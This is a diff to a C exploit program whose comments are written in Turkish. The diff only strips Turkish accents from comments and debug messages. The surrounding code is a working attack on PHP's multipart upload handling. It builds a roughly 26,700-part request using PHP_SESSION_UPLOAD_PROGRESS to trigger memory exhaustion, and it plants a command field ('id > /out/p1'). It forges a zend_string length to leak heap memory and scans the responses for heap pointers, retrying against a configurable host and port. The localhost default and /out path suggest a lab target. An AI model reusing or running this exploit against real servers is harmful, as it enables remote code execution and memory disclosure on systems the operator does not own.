@@ -18,7 +18,7 @@
 static const char *HOST = "127.0.0.1";
 static int PORT = 8080;
 static int OOM_MB = 12;
-static int TRIES = 10; // Doğruluk olasılığı için deneme sayısı artırıldı
+static int TRIES = 10; // Dogruluk olasiligi icin deneme sayisi artirildi
 
 #define OOM_BND "S17"
 #define LEAK_BND "BNDRY12345"
@@ -51,9 +51,9 @@ static void b_raw(B *b, const void *p, size_t n) {
 /* ---------- OOM Body Builder ---------- */
 static unsigned long build_oom_body(char *buf, unsigned long cap) {
     B b = {buf, 0, cap};
-    char tmp[1024]; // Parametre uzunluğu için tampon genişletildi
+    char tmp[1024]; // Parametre uzunlugu icin tampon genisletildi
 
-    // Sınır çizgisini tam vurabilmek için optimize edilmiş döngü sayısı
+    // Sinir cizgisini tam vurabilmek icin optimize edilmis dongu sayisi
     for (int i = 0; i < 26700; i++) {
         int n = snprintf(tmp, sizeof(tmp),
             "--%s\r\n"
@@ -73,7 +73,7 @@ static unsigned long build_oom_body(char *buf, unsigned long cap) {
 
     b_str(&b, "--" OOM_BND "\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\npwn\r\n");
 
-    /* Tetiği çekecek olan hedef veri bloğu */
+    /* Tetigi cekecek olan hedef veri blogu */
     b_str(&b, "--" OOM_BND "\r\nContent-Disposition: form-data; name=\"tuzak\"\r\n\r\nid > /out/p1\r\n");
     b_str(&b, "\r\n--" OOM_BND "--\r\n");
 
@@ -113,7 +113,7 @@ static unsigned long build_leak_body(char *buf, unsigned long cap) {
     unsigned long patch_offset = b.off;
     b_bytes(&b, 'A', 79);
 
-    /* zend_string sahteciliği yaması (Hafıza adres hizalaması güvenli hale getirildi) */
+    /* zend_string sahteciligi yamasi (Hafiza adres hizalamasi guvenli hale getirildi) */
     unsigned long long fake_len = 0x1000;
     if (patch_offset + 0x18 < b.cap) {
         memcpy(b.buf + patch_offset + 0x10, &fake_len, 8);
@@ -135,7 +135,7 @@ static int http_post(const char *body, unsigned long body_len,
     addr.sin_port = htons(PORT);
     inet_pton(AF_INET, HOST, &addr.sin_addr);
 
-    /* Çökme anlarında soketin asılı kalmaması için 3 saniyelik zaman aşımı */
+    /* Cokme anlarinda soketin asili kalmamasi icin 3 saniyelik zaman asimi */
     struct timeval tv;
     tv.tv_sec = 3;
     tv.tv_usec = 0;
@@ -197,20 +197,20 @@ static int heap_ptrs(const unsigned char *buf, int len) {
 }
 
 /* ---------- Main Execution ---------- */
-/* main fonksiyonunun güncellenmiş ve hata ayıklama satırları eklenmiş hali */
+/* main fonksiyonunun guncellenmis ve hata ayiklama satirlari eklenmis hali */
 int main(int argc, char **argv) {
     if (argc > 1) HOST = argv[1];
     if (argc > 2) PORT = atoi(argv[2]);
     if (argc > 3) OOM_MB = atoi(argv[3]);
     if (argc > 4) TRIES = atoi(argv[4]);
 
-    // Bellek alanı 32 MB olarak genişletildi
+    // Bellek alani 32 MB olarak genisletildi
     unsigned long oom_cap = 32 * 1024 * 1024; 
     char *oom_body = malloc(oom_cap);
     unsigned long oom_len = build_oom_body(oom_body, oom_cap);
     
-    // HATA AYIKLAMA 1: C kodunun ürettiği veri boyutunu görelim
-    printf("[*] Üretilen OOM İstek Gövdesi Boyutu: %lu bayt (%.2f MB)\n", 
+    // HATA AYIKLAMA 1: C kodunun urettigi veri boyutunu gorelim
+    printf("[*] Uretilen OOM Istek Govdesi Boyutu: %lu bayt (%.2f MB)\n", 
            oom_len, (double)oom_len / (1024 * 1024));
 
     if (!oom_len) { 
@@ -243,9 +243,9 @@ int main(int argc, char **argv) {
             char *oom_resp = malloc(65536);
             int oom_rlen = http_post(oom_body, oom_len, OOM_BND, oom_resp, 65536);
             
-            // HATA AYIKLAMA 2: Sunucunun OOM isteğine verdiği ham yanıtı ilk denemede ekrana basalım
+            // HATA AYIKLAMA 2: Sunucunun OOM istegine verdigi ham yaniti ilk denemede ekrana basalim
             if (t == 0 && oom_rlen > 0) {
-                printf("\n[DEBUG] Sunucunun OOM İsteğine Verdiği Ham Yanıt:\n%.300s\n\n", oom_resp);
+                printf("\n[DEBUG] Sunucunun OOM Istegine Verdigi Ham Yanit:\n%.300s\n\n", oom_resp);
             }
             
             free(oom_resp);
